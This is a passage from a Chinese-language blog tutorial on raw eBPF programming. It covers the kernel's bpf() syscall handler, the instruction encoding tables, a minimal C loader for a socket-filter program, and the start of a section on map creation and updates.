<span class="hljs-type">int</span> size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span>;</span><br><span class="hljs-type">bool</span> capable;<br><span class="hljs-type">int</span> err;<br><br>capable = bpf_capable() || !sysctl_unprivileged_bpf_disabled;<br><br><span class="hljs-comment">/* Intent here is for unprivileged_bpf_disabled to block key object</span><br><span class="hljs-comment"> * creation commands for unprivileged users; other actions depend</span><br><span class="hljs-comment"> * of fd availability and access to bpffs, so are dependent on</span><br><span class="hljs-comment"> * object creation success.  Capabilities are later verified for</span><br><span class="hljs-comment"> * operations such as load and map create, so even with unprivileged</span><br><span class="hljs-comment"> * BPF disabled, capability checks are still carried out for these</span><br><span class="hljs-comment"> * and other operations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!capable &amp;&amp;<br>    (cmd == BPF_MAP_CREATE || cmd == BPF_PROG_LOAD))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>err = bpf_check_uarg_tail_zero(uattr, <span class="hljs-keyword">sizeof</span>(attr), size);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br>size = <span class="hljs-type">min_t</span>(u32, size, <span class="hljs-keyword">sizeof</span>(attr));<br><br><span class="hljs-comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span><br><span class="hljs-built_in">memset</span>(&amp;attr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(attr));<br><span class="hljs-keyword">if</span> (copy_from_bpfptr(&amp;attr, uattr, size) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>err = security_bpf(cmd, &amp;attr, size);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> BPF_MAP_CREATE:<br>err = map_create(&amp;attr);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br>err = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br>SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-keyword">return</span> __sys_bpf(cmd, USER_BPFPTR(uattr), size);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-raw-eBPF-程序编写入门"><a href="#0x03-raw-eBPF-程序编写入门" class="headerlink" title="0x03. raw eBPF 程序编写入门"></a>0x03. raw eBPF 程序编写入门</h1><p>由于 eBPF 相关的各种操作实际上都是通过 <code>bpf()</code> 系统调用完成的，因此我们可以通过直接调用 <code>bpf()</code> 系统调用来感受 eBPF 的魅力：）</p><blockquote><p>注：在 eBPF 的实际应用中很少会直接写 raw BPF 指令，而是会借助诸如 <code>bcc</code> 这样的各类工具，不过那不是这一篇博客的重点：）</p><blockquote><p>有时间的话再在后面的博客中简单讲讲（</p></blockquote></blockquote><blockquote><p>注2：内核在 <code>/samples/bpf</code> 目录下提供了很多帮助我们快速编写 eBPF 程序的工具与一些示例，其中 <code>/samples/bpf/bpf_insn.h</code> 文件<strong>提供了封装好的各类指令模板</strong> ：）</p></blockquote><h2 id="一、eBPF-指令格式"><a href="#一、eBPF-指令格式" class="headerlink" title="一、eBPF 指令格式"></a>一、eBPF 指令格式</h2><p>eBPF 为优雅的 RISC 指令集（<del>这就要说到 Intel CISC 的含屎量了</del>），单条指令长度为 8 字节，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* 操作码 */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* 目的寄存器 */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* 源寄存器 */</span><br>__s16off;<span class="hljs-comment">/* 有符号偏移 */</span><br>__s32imm;<span class="hljs-comment">/* 有符号立即数 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>而 eBPF 实际上有两种编码模式：</p><ul><li>基础编码，单条指令为 64 bit</li><li>宽指令编码， <em>在基础编码后添加一个 64bit 的立即数</em> ，单条指令为 128 bit</li></ul><p>基础编码的指令格式如下：</p><table><thead><tr><th align="center">长度</th><th align="center">8 bits</th><th align="center">4 bits</th><th align="center">4 bits</th><th align="center">16 bits</th><th align="center">32 bits</th></tr></thead><tbody><tr><td align="center">含义</td><td align="center">opcode(操作码)</td><td align="center">dst_reg(目的寄存器)</td><td align="center">src_reg(源寄存器)</td><td align="center">off(有符号偏移)</td><td align="center">imm(有符号32位立即数)</td></tr></tbody></table><p>eBPF 指令中的 <code>opcode</code> 域长度为 8 bit，其中<strong>低 3 位固定表示指令类型</strong>，剩下的高 5 位根据类型不同用途也不同</p><p>指令类型如下表所示： </p><table><thead><tr><th align="center">类型</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BPF_LD</td><td align="center">0x00</td><td align="center">只能用于宽指令，从 <code>imm64</code> 中加载数据到寄存器</td></tr><tr><td align="center">BPF_LDX</td><td align="center">0x01</td><td align="center">从内存中加载数据到 <code>dst_reg</code></td></tr><tr><td align="center">BPF_ST</td><td align="center">0x02</td><td align="center">把 <code>imm32</code> 数据保存到内存中</td></tr><tr><td align="center">BPF_STX</td><td align="center">0x03</td><td align="center">把 <code>src_reg</code> 寄存器数据保存到内存</td></tr><tr><td align="center">BPF_ALU</td><td align="center">0x04</td><td align="center">32bit 算术运算</td></tr><tr><td align="center">BPF_JMP</td><td align="center">0x05</td><td align="center">64bit 跳转操作</td></tr><tr><td align="center">BPF_JMP32</td><td align="center">0x06</td><td align="center">32bit 跳转操作</td></tr><tr><td align="center">BPF_ALU64</td><td align="center">0x07</td><td align="center">64bit 算术运算</td></tr></tbody></table><blockquote><p>注：在 classic BPF 中 <code>0x06</code> 为函数返回指令 <code>BPF_RET</code> ，<code>0x07</code> 为寄存器交换指令 <code>BPF_MISC</code> （cBPF 只有 <code>A</code> 和 <code>X</code> 两个寄存器）</p></blockquote><p><img src="https://s2.loli.net/2023/05/29/ctkw1sIlfAYp8Hz.png" alt="我超,__！.png"></p><h3 id="算术-amp-跳转指令"><a href="#算术-amp-跳转指令" class="headerlink" title="算术 &amp; 跳转指令"></a>算术 &amp; 跳转指令</h3><p>对于算术 &amp; 跳转指令而言由高位到低位分为三个部分：</p><table><thead><tr><th align="center">4 bit</th><th align="center">1 bit</th><th align="center">3 bit</th></tr></thead><tbody><tr><td align="center">operation code （操作代码）</td><td align="center">source（源）</td><td align="center">instruction class （指令类型）</td></tr></tbody></table><h4 id="①-操作代码"><a href="#①-操作代码" class="headerlink" title="① 操作代码"></a>① 操作代码</h4><p>opcode 的<strong>最高 4 bit 用来保存操作代码</strong>，对于算术指令而言有如下类型：</p><table><thead><tr><th align="center">指令类型</th><th align="center">操作代码</th><th align="center">值</th><th>描述</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ADD</td><td align="center">0x00</td><td>dst +&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_SUB</td><td align="center">0x10</td><td>dst -&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MUL</td><td align="center">0x20</td><td>dst *&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_DIV</td><td align="center">0x30</td><td>dst &#x2F;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_OR</td><td align="center">0x40</td><td>dst |&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_AND</td><td align="center">0x50</td><td>dst &amp;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_LSH</td><td align="center">0x60</td><td>dst &lt;&lt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_RSH</td><td align="center">0x70</td><td>dst &gt;&gt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_NEG</td><td align="center">0x80</td><td>dst &#x3D; ~src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOD</td><td align="center">0x90</td><td>dst %&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_XOR</td><td align="center">0xA0</td><td>dst ^&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOV</td><td align="center">0xB0</td><td>dst &#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ARSH</td><td align="center">0xC0</td><td>算术右移操作（正数补 0 负数补 1 ）</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">0xD0</td><td>字节序转换</td></tr></tbody></table><p>对于跳转指令而言有如下类型：</p><table><thead><tr><th align="center"><strong>指令类型</strong></th><th align="center"><strong>操作代码</strong></th><th align="center"><strong>值</strong></th><th><strong>描述</strong></th><th>备注</th></tr></thead><tbody><tr><td align="center">BPF_JMP</td><td align="center">BPF_JA</td><td align="center">0x00</td><td>PC +&#x3D; off</td><td>仅用于 BPF_JMP</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JEQ</td><td align="center">0x10</td><td>PC +&#x3D; off if dst &#x3D;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGT</td><td align="center">0x20</td><td>PC +&#x3D; off if dst &gt; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGE</td><td align="center">0x30</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSET</td><td align="center">0x40</td><td>PC +&#x3D; off if dst &amp; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JNE</td><td align="center">0x50</td><td>PC +&#x3D; off if dst !&#x3D; src</td><td>仅 eBPF：不等时跳转</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGT</td><td align="center">0x60</td><td>PC +&#x3D; off if dst &gt; src</td><td>仅 eBPF：有符号 ‘&gt;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGE</td><td align="center">0x70</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td>仅 eBPF：有符号 ‘&gt;&#x3D;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_CALL</td><td align="center">0x80</td><td>函数调用</td><td>仅 eBPF：函数调用</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_EXIT</td><td align="center">0x90</td><td>函数或者程序返回</td><td>仅 eBPF：函数返回</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLT</td><td align="center">0xA0</td><td>PC +&#x3D; off if dst &lt; src</td><td>仅 eBPF：无符号 ‘&lt;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLE</td><td align="center">0xB0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>仅 eBPF：无符号 ‘&lt;&#x3D;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLT</td><td align="center">0xC0</td><td>PC +&#x3D; off if dst &lt; src</td><td>仅 eBPF：有符号 ‘&lt;’</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLE</td><td align="center">0xD0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>仅 eBPF：有符号 ‘&lt;&#x3D;’</td></tr></tbody></table><h4 id="②-源"><a href="#②-源" class="headerlink" title="② 源"></a>② 源</h4><p>opcode 中间的一个 bit 用来表示 <strong>源</strong> ，对于普通的跳转与算术指令而言含义如下表：</p><table><thead><tr><th align="center">指令类型</th><th align="center">源</th><th align="center">值</th><th>描述</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_K</td><td align="center">0x00</td><td>使用32-bit <code>imm32</code> 作为源操作数</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_X</td><td align="center">0x08</td><td>使用源寄存器 （<code>src_reg</code>） 作为源操作数</td></tr></tbody></table><p>对于 <code>BPF_END</code> 操作码而言含义如下：</p><table><thead><tr><th align="center">指令类型</th><th align="center">操作代码</th><th align="center">源</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_LE</td><td>0x00</td><td>转为小端序</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_BE</td><td>0x08</td><td>转为大端序</td></tr></tbody></table><h3 id="Load-amp-Store-指令"><a href="#Load-amp-Store-指令" class="headerlink" title="Load &amp; Store 指令"></a>Load &amp; Store 指令</h3><p>对于 Load &amp; Store 指令而言，opcode 由高到低分为如下三部分：</p><table><thead><tr><th align="center">3 bits</th><th align="center">2 bit</th><th align="center">3 bits</th></tr></thead><tbody><tr><td align="center">mode（模式）</td><td align="center">size（大小）</td><td align="center">instruction class （指令类型）</td></tr></tbody></table><h4 id="①-大小"><a href="#①-大小" class="headerlink" title="① 大小"></a>① 大小</h4><p> Load &amp; Store 指令的 <strong>size</strong> 域用来表示<strong>操作的字节数</strong>：</p><blockquote><p>不知道为啥排序设为 4 2 1 8 :（</p></blockquote><table><thead><tr><th align="center">大小</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BPF_W</td><td align="center">0x00</td><td align="center">单字（4 字节）</td></tr><tr><td align="center">BPF_H</td><td align="center">0x08</td><td align="center">半字（2字节）</td></tr><tr><td align="center">BPF_B</td><td align="center">0x10</td><td align="center">单字节（1字节）</td></tr><tr><td align="center">BPF_DW</td><td align="center">0x18</td><td align="center">双字（8字节）</td></tr></tbody></table><h4 id="②-模式"><a href="#②-模式" class="headerlink" title="② 模式"></a>② 模式</h4><p> Load &amp; Store 指令的 <strong>mode</strong> 域用来表示<strong>操作的模式</strong>，也就是如何去操作指定大小的数据：</p><table><thead><tr><th align="center">模式</th><th align="center">值</th><th align="center">描述</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">BPF_IMM</td><td align="center">0x00</td><td align="center">64 位立即数</td><td align="center">eBPF 为64 位立即数，cBPF 中为 32 位</td></tr><tr><td align="center">BPF_ABS</td><td align="center">0x20</td><td align="center">数据包直接访问</td><td align="center">兼容自 cBPF 指令。R6 作为隐式输入，存放 <code>struct *sk_buff</code> ；R0 作为隐式输出，存放包中读出数据；R1 ~ R5 作为 scratch registers，在每次调用后会被清空</td></tr><tr><td align="center">BPF_IND</td><td align="center">0x40</td><td align="center">数据包间接访问</td><td align="center">同 BPF_ABS</td></tr><tr><td align="center">BPF_MEM</td><td align="center">0x60</td><td align="center">赋值给 *(size *)(dst_reg + off)</td><td align="center">标准 load &amp; store 操作</td></tr><tr><td align="center">BPF_LEN</td><td align="center">0x80</td><td align="center">保留指令</td><td align="center">仅用于 cBPF</td></tr><tr><td align="center">BPF_MSH</td><td align="center">0xA0</td><td align="center">保留指令</td><td align="center">仅用于 cBPF</td></tr><tr><td align="center">BPF_XADD</td><td align="center">0xC0</td><td align="center">原子操作，*(无符号类型 *)(dst_reg + off16) 运算&#x3D; src_reg</td><td align="center">仅用于 eBPF，不支持 1 &#x2F; 2 字节曹祖</td></tr></tbody></table><p>对于 <code>BPF_XADD</code>， <code>imm32</code> 域被用来表示原子操作的运算类型：</p><table><thead><tr><th align="center">imm32</th><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BPF_ADD</td><td align="center">0x00</td><td align="center">原子加</td></tr><tr><td align="center">BPF_OR</td><td align="center">0x40</td><td align="center">原子或</td></tr><tr><td align="center">BPF_AND</td><td align="center">0x50</td><td align="center">原子与</td></tr><tr><td align="center">BPF_XOR</td><td align="center">0xa0</td><td align="center">原子异或</td></tr></tbody></table><blockquote><p><del>反正👴看得是有点头大的</del></p></blockquote><h2 id="二、raw-eBPF-程序编写"><a href="#二、raw-eBPF-程序编写" class="headerlink" title="二、raw eBPF 程序编写"></a>二、raw eBPF 程序编写</h2><p>一个最简单的 eBPF 程序<strong>便是一个</strong> <code>bpf_insn</code> <strong>结构体数组</strong>，我们可以直接在用户态下编写一个 <code>bpf_insn</code> 结构体数组并直接调用 <code>bpf()</code> 系统调用完成 eBPF 程序的创建与挂载：）</p><p>最简单的方法便是直接按如下形式定义一条基本的 eBPF 指令：</p><blockquote><p> 注：这里可以直接使用内核源码目录下提供的 <code>/samples/bpf/bpf_insn.h</code> ：）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)        \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                              \</span><br><span class="hljs-meta">        .code         = CODE,                         \</span><br><span class="hljs-meta">        .dst_reg     = DST,                           \</span><br><span class="hljs-meta">        .src_reg     = SRC,                           \</span><br><span class="hljs-meta">        .off         = OFF,                           \</span><br><span class="hljs-meta">        .imm         = IMM                            \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>之后直接开写就行，需要注意的是我们应当以一条 <code>跳转结束指令</code> （opcode 为 <code>BPF_JMP | BPF_EXIT</code> ）作为结尾，下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEST_BPF_LOG_SZ 0x10000</span><br><span class="hljs-type">char</span> test_bpf_log_buf[TEST_BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_bpf_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;test_bpf_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(test_bpf_prog) / <span class="hljs-keyword">sizeof</span>(test_bpf_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) test_bpf_log_buf,<br>    .log_size = TEST_BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> test_bpf_prog_fd;<br>    <span class="hljs-type">char</span> *err_msg;<br><br>    <span class="hljs-comment">/* load bpf prog into kernel */</span><br>    test_bpf_prog_fd = bpf(BPF_PROG_LOAD, &amp;test_bpf_attr);<br>    <span class="hljs-keyword">if</span> (test_bpf_prog_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_msg = <span class="hljs-string">&quot;FAILED to load bpf program!&quot;</span>;<br>        <span class="hljs-keyword">goto</span> err_bpf_load;<br>    &#125;<br><br>    <span class="hljs-comment">/* output the log */</span><br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br><br>    close(test_bpf_prog_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_bpf_load:<br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br>err_socket:<br>    err_exit(err_msg);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>内核会将相关的运行日志写入到我们所指定的缓冲区当中，这里输出日志缓冲区可以看到内核成功地解析了我们的 eBPF 程序：</p><p><img src="https://s2.loli.net/2023/05/31/6wJAz7CSFG91DmQ.png" alt="image.png"></p><h2 id="三、raw-eBPF-map-使用"><a href="#三、raw-eBPF-map-使用" class="headerlink" title="三、raw eBPF map 使用"></a>三、raw eBPF map 使用</h2><p>eBPF map 为以 <code>key→value</code> 映射格式存储数据的通用的数据存储结构，用于在不同程序之间共享数据，本节主要介绍 eBPF map 的基本用法</p><h3 id="创建-eBPF-map"><a href="#创建-eBPF-map" class="headerlink" title="创建 eBPF map"></a>创建 eBPF map</h3><p>我们可以通过 <code>BPF_MAP_CREATE</code> 命令创建一个新的 eBPF map，其会返回一个文件描述符作为该 map 的引用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="更新-eBPF-map"><a href="#更新-eBPF-map" class="headerlink" title="更新 eBPF map"></a>更新 eBPF map</h3><p>我们可以通过 <code>BPF_MAP_UPDATE</code> 命令更新 map 中对应的 <code>key→value</code> 映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>flags 应当为如下之一：</p><table><thead><tr><th align="center">flags</th><th align="center">描述</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">BPF_ANY</td><td align="center">有则更新，无则新建</td><td align="center"></td></tr><tr><td align="center">BPF_NOEXIST</td><td align="center">仅在不存在时进行创建</td><td align="center">若已有对应的 key 则返回 <code>-EEXIST</code></td></tr><tr><td align="center">BPF_EXIST</td><td align="center">仅在存在时进行更新</td><td align="center">若无对应的 key 